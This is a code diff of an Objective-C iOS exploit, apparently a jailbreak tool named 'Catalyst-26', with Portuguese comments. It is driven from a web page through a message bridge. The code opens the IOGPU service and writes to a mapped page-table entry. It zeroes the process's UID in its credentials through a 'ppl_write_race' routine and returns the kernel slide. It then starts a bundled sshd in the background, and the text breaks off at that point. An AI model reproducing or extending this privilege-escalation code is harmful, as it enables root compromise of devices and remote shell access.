@@ -3,7 +3,6 @@
 #import <spawn.h>
 #import <IOKit/IOKitLib.h>
 
-// Definições externas para APIs de baixo nível
 extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
 
@@ -44,13 +43,9 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOGPU"));
     io_connect_t connect;
     IOServiceOpen(service, mach_task_self(), 0, &connect);
-
     mach_vm_address_t shared_page = 0;
     mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
-
-    if (shared_page) {
-        *(uint64_t*)(shared_page) = val;
-    }
+    if (shared_page) { *(uint64_t*)(shared_page) = val; }
     IOServiceClose(connect);
 }
 
@@ -71,29 +66,14 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
                  replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
     
     NSString *action = message.body[@"action"];
-
-    // 1. Resposta para o Botão de Teste
     if ([action isEqualToString:@"test_bridge"]) {
         replyHandler(@{@"info": @"Catalyst-26 Ativo (A13)"}, nil);
-    } 
-    
-    // 2. Resposta para o Botão de Exploit
-    else if ([action isEqualToString:@"pte_patch"]) {
-        // Executa a escalada de privilégio
+    } else if ([action isEqualToString:@"pte_patch"]) {
         uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) {
-            [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0
-        }
-        
+        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0];
         uint64_t slide = [self getKernelSlide];
+        replyHandler(@{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
         
-        // Retorna sucesso para o index.html
-        replyHandler(@{
-            @"status": @"SUCCESS", 
-            @"slide": [NSString stringWithFormat:@"0x%llx", slide]
-        }, nil);
-        
-        // Tenta o spawn do SSHD em background
         NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
         if (path) {
             pid_t pid;
